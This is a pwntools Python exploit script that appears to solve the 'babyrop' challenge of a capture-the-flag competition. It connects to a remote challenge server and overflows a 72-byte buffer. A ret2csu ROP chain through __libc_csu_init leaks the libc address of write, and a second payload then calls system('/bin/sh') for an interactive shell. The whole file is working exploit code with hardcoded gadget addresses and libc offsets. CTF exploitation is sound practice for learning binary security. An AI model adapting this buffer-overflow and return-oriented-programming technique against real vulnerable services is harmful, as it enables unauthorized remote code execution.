from pwn import *

binary = './babyrop'
elf = ELF(binary)
rop = ROP(elf)
context.binary = binary

local = True
local = False

if local:
    p = process(binary)
else:
    p = remote('dicec.tf', 31924)

ret = 0x40101a
write_plt = 0x401030
write_got = 0x404018
gets_plt  = 0x401040
pop_rdi = 0x004011d3        # 0x004011d3: pop rdi ; ret  ;  (1 found)
pop_rsi_r15 = 0x004011d1    # 0x004011d1: pop rsi ; pop r15 ; ret  ;  (1 found)
pop_r14_r15 = 0x004011d0    # 0x004011d0: pop r14 ; pop r15 ; ret  ;  (1 found)
call_write = 0x40114f
main = 0x401136
mov_rdx_r14 = 0x4011b0      # __libc_csu_init
dummy = 0

'''
  4011b0:	4c 89 f2             	mov    rdx,r14
  4011b3:	4c 89 ee             	mov    rsi,r13
  4011b6:	44 89 e7             	mov    edi,r12d
  4011b9:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
  4011bd:	48 83 c3 01          	add    rbx,0x1
  4011c1:	48 39 dd             	cmp    rbp,rbx
  4011c4:	75 ea                	jne    4011b0 <__libc_csu_init+0x40>
  4011c6:	48 83 c4 08          	add    rsp,0x8
  4011ca:	5b                   	pop    rbx
  4011cb:	5d                   	pop    rbp
  4011cc:	41 5c                	pop    r12
  4011ce:	41 5d                	pop    r13
  4011d0:	41 5e                	pop    r14
  4011d2:	41 5f                	pop    r15
  4011d4:	c3                   	ret    
'''

payload  = b'A' * 72
payload += p64(0x4011ca)
payload += p64(0)
payload += p64(1)
payload += p64(1)
payload += p64(write_got)
payload += p64(6)
payload += p64(write_got)
payload += p64(0x4011b0)

payload += p64(dummy)
payload += p64(dummy)
payload += p64(dummy)
payload += p64(dummy)
payload += p64(dummy)
payload += p64(dummy)
payload += p64(dummy)
payload += p64(main)

p.sendlineafter('Your name: ', payload)
write_addr = u64(p.recv(6)[:6].ljust(8, b'\0'))
print(hex(write_addr))

if local:
    libc_addr = write_addr - 0x110210
    system_addr = libc_addr + 0x4f550
    binsh = libc_addr + 0x1b3e1a
else:
    libc_addr = write_addr - 0x1111d0
    system_addr = libc_addr + 0x055410
    binsh = libc_addr + 0x1b75aa

payload  = b'A' * 72
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system_addr)
p.sendlineafter('Your name: ', payload)

p.interactive()
